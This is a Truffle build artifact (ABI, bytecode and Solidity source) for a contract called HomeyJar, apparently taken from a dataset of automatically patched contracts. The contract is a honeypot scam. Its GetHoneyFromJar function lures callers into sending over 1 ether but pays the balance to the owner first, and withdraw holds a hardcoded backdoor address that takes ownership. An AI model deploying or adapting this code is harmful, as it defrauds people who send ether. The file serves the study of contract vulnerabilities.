{
  "contractName": "HomeyJar",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "GetHoneyFromJar",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "adr",
          "type": "address"
        },
        {
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "Command",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b506104fd806100606000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633ccfd60b14610064578063b4a99a4e1461006e578063ba21d62a146100c5578063e0b0452114610141575b005b61006c61014b565b005b34801561007a57600080fd5b506100836102c4565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61013f600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102e9565b005b6101496103e1565b005b732f61e7e1023bc22063b8da897d8323965a7712b773ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156101e857732f61e7e1023bc22063b8da897d8323965a7712b76000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561024357600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102c1573d6000803e3d6000fd5b50565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561034657600080fd5b8273ffffffffffffffffffffffffffffffffffffffff16348360405180828051906020019080838360005b8381101561038c578082015181840152602081019050610371565b50505050905090810190601f1680156103b95780820380516001836020036101000a031916815260200191505b5091505060006040518083038185875af19250505090508015156103dc57600080fd5b505050565b670de0b6b3a76400003411156104cf576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561046f573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104cd573d6000803e3d6000fd5b505b5600a165627a7a72305820d3f71eb1f473505c11cb9be7ab85958ceb45d2e605d0be65b19694f1a6304ede0029",
  "source": "pragma solidity ^0.4.19;\n\ncontract sGuardPlus {\n    constructor() internal {}\n}\n\ncontract HomeyJar {\n    address public Owner = msg.sender;\n\n    function() public payable {}\n\n    function GetHoneyFromJar() public payable {\n        if (msg.value > 1 ether) {\n            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function withdraw() public payable {\n        if (msg.sender == 0x2f61E7e1023Bc22063B8da897d8323965a7712B7) {\n            Owner = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;\n        }\n\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address adr, bytes data) public payable {\n        require(msg.sender == Owner);\n        bool __sent_result100 = adr.call.value(msg.value)(data);\n        require(__sent_result100);\n    }\n}\n",
  "sourcePath": "/workdir/truffle_example/after/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4/contracts/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol.fixed.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.8",
  "updatedAt": "2022-08-13T03:04:26.330Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}